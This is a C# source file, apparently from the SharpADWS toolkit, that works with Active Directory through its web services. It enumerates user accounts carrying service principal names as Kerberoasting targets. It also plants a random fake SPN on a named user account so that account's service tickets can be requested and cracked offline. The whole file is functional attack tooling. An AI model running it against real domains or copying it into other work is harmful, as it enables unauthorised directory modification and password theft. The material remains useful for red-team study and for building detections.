using SharpADWS.ADWS.Enumeration;
using SharpADWS.ADWS;
using System;
using System.Collections.Generic;
using System.ServiceModel.Channels;
using SharpADWS.ADWS.Transfer;
using System.DirectoryServices.Protocols;
using System.Text;

namespace SharpADWS.Methods
{
    internal class Kerberoastable
    {
        private ADWSConnection adwsConnection = null;
        private string DefaultNamingContext = null;

        public Kerberoastable(ADWSConnection adwsConnection)
        {
            this.adwsConnection = adwsConnection;
            this.DefaultNamingContext = adwsConnection.DefaultNamingContext;
        }

        public void FindKerberoastable()
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> userObjects = enumerateRequest.Enumerate("(&(objectClass=user)(servicePrincipalName=*))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "servicePrincipalName" });

            Console.WriteLine();

            if(userObjects.Count == 0)
            {
                Console.WriteLine("[-] Not found kerberoastable users!");
                return;
            }

            Console.WriteLine("[*] Found kerberoastable users: ");

            foreach (ADObject userObject in userObjects)
            {
                if (userObject.Class == "user" && userObject.ServicePrincipalName != null)
                {
                    foreach (string spn in userObject.ServicePrincipalName)
                    {
                        Console.WriteLine("[*] " + userObject.DistinguishedName);
                        Console.WriteLine("[*]     " + spn);
                    }
                    
                }
            }
        }

        public void SetKerberoastable(string sAMAccountName)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(objectClass=user)(sAMAccountName={sAMAccountName}))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to kerberoast does not exist!");
                return;
            }

            foreach (ADObject userObject in adObjects)
            {
                if (userObject.Class == "user")
                {
                    PutRequest putRequest = new PutRequest(adwsConnection);
                    Message modifyResponse = putRequest.ModifyRequest(userObject.DistinguishedName, DirectoryAttributeOperation.Add, "servicePrincipalName", $"HOST/{GenerateRandomHostname(8)}");

                    if (!modifyResponse.IsFault)
                    {
                        Console.WriteLine($"[*] Kerberoast user {sAMAccountName} successfully!");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Kerberoasting user {sAMAccountName} failed!");
                    }
                }
            }
        }

        private string GenerateRandomHostname(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            for (int i = 0; i < length; i++)
            {
                builder.Append(chars[random.Next(chars.Length)]);
            }
            return "WIN-" + builder.ToString().ToUpper();
        }
    }
}
